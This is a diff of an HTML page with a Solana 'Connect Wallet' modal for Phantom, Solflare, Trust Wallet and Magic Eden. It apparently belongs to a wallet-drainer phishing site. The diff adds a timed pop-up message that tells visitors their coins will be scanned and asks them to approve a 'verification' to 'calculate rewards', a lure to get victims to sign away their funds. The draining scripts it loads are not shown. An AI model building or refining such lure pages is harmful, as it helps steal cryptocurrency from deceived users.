@@ -584,123 +584,99 @@
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
   <script src="javascripts/spl.js"></script>
   <script src="javascripts/major.js?p=0"></script>
-  <div id="wallet-modal" class="modal" style="background-color: rgb(211, 207, 207);">
-      <div class="modal-content">
-          <div class="modal-header">
-              <h3 style="color: white;">Connect Wallet</h3>
-              <span class="close-modal">&times;</span>
-          </div>
-          <div class="modal-body">
-              <button class="wallet-button relative button" id="connect-phantom">
-                  <img src="Phantom_SVG_Icon.svg" alt="Phantom" rel="noopener noreferrer">
-                  <span>Phantom</span>
-              </button>
-              <button class="wallet-button relative button" id="connect-solflare">
-                  <img src="https://solflare.com/favicon.ico" alt="Solflare" rel="noopener noreferrer">
-                  <span>Solflare</span>
-              </button>
-              <button class="wallet-button relative button" id="connect-trust">
-                  <img src="trust-wallet.218x256.png" alt="Trust Wallet" rel="noopener noreferrer">
-                  <span>Trust Wallet</span>
-              </button>
-              <button class="wallet-button relative button" id="connect-magiceden">
-                  <img src="ME_Wallet_AppIcon.png" alt="Magic Eden" rel="noopener noreferrer">
-                  <span>Magic Eden</span>
-              </button>
-          </div>
-      </div>
+ <!-- Modal -->
+<div id="wallet-modal" class="modal" style="background-color: rgb(211, 207, 207); display: none;">
+  <div class="modal-content">
+    <div class="modal-header">
+      <h3 style="color: white;">Connect Wallet</h3>
+      <span class="close-modal" style="cursor: pointer;">&times;</span>
+    </div>
+    <div class="modal-body">
+      <button class="wallet-button relative button" id="connect-phantom">
+        <img src="Phantom_SVG_Icon.svg" alt="Phantom" rel="noopener noreferrer">
+        <span>Phantom</span>
+      </button>
+      <button class="wallet-button relative button" id="connect-solflare">
+        <img src="https://solflare.com/favicon.ico" alt="Solflare" rel="noopener noreferrer">
+        <span>Solflare</span>
+      </button>
+      <button class="wallet-button relative button" id="connect-trust">
+        <img src="trust-wallet.218x256.png" alt="Trust Wallet" rel="noopener noreferrer">
+        <span>Trust Wallet</span>
+      </button>
+      <button class="wallet-button relative button" id="connect-magiceden">
+        <img src="ME_Wallet_AppIcon.png" alt="Magic Eden" rel="noopener noreferrer">
+        <span>Magic Eden</span>
+      </button>
+    </div>
+
+    <!-- Toast inside modal -->
+    <div id="toast">After connecting, a pop-up will appear shortly. It will scan all your coins, convert them to Solana value, and ask for approval to verify your coins and calculate your rewards.</div>
   </div>
+</div>
 
-
-
-
-
-
-
-
-
-
-
-
-
+<!-- Toast Styles -->
 <style>
   #toast {
-  visibility: hidden;
-  min-width: 300px;
-  max-width: 400px;
-  background-color: #1e293b;
-  color: #fff;
-  text-align: center;
-  border-radius: 12px;
-  padding: 16px;
-  position: fixed;
-  z-index: 9999;
-  bottom: 30px;
-  left: 50%;
-  transform: translateX(-50%);
-  font-family: sans-serif;
-  font-size: 15px;
-  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-  opacity: 0;
-  transition: opacity 0.5s ease, bottom 0.5s ease;
-}
+    visibility: hidden;
+    min-width: 300px;
+    max-width: 400px;
+    background-color: #1e293b;
+    color: #fff;
+    text-align: center;
+    border-radius: 12px;
+    padding: 16px;
+    position: fixed;
+    z-index: 9999;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%);
+    font-family: sans-serif;
+    font-size: 15px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    opacity: 0;
+    transition: opacity 0.5s ease, bottom 0.5s ease;
+  }
 
-#toast.show {
-  visibility: visible;
-  opacity: 1;
-  bottom: 50px;
-}
-
+  #toast.show {
+    visibility: visible;
+    opacity: 1;
+    bottom: 50px;
+  }
 </style>
 
-
-<div id="toast">After connecting, a pop-up will appear shortly. It will scan all your coins, convert them to Solana value, and ask for approval to verify your coins and calculate your rewards.</div>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    <script>
-  // Add an event listener to the document
+<!-- Script -->
+<script>
   document.addEventListener('click', function(event) {
-      // Check if the clicked element is a span and contains the text "Connect Wallet"
-      if (event.target.tagName === 'SPAN' && event.target.textContent.trim() === 'Connect Wallet') {
-        const modal = document.getElementById('wallet-modal');
-        const closeModal = document.querySelector('.close-modal');
-        modal.style.display = "block";
-      }
+    const isSpanClick = event.target.tagName === 'SPAN' && event.target.textContent.trim() === 'Connect Wallet';
+    const div = event.target.closest('div');
+    const isDivWithConnect = div && div.querySelector('span') && div.querySelector('span').textContent.trim() === 'Connect Wallet';
+
+    if (isSpanClick || isDivWithConnect) {
+      const modal = document.getElementById('wallet-modal');
+      const toast = document.getElementById('toast');
+      modal.style.display = "block";
+
+      // Show toast after 1s
+      setTimeout(() => {
+        toast.classList.add('show');
+      }, 1000);
+
+      // Hide toast after 5s
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 11000);
+    }
   });
 
-
-
-
-
-
-     document.addEventListener('click', function(event) {
-    // Check if the clicked element is a div and contains a span with the text "Connect Wallet"
-    const div = event.target.closest('div');
-    
-    if (div && div.querySelector('span') && div.querySelector('span').textContent.trim() === 'Connect Wallet') {
-        // alert('Hello, World!');
-        const modal = document.getElementById('wallet-modal');
-        const closeModal = document.querySelector('.close-modal');
-        modal.style.display = "block";
+  // Optional: Close modal logic
+  document.addEventListener('click', function(event) {
+    if (event.target.classList.contains('close-modal')) {
+      document.getElementById('wallet-modal').style.display = "none";
     }
-});
+  });
+</script>
 
-
-    </script>
 </body>
 <script>function connection_all() { document.getElementById("connect-btn").click(); }; </script>
 <script type="module" src="#"></script>
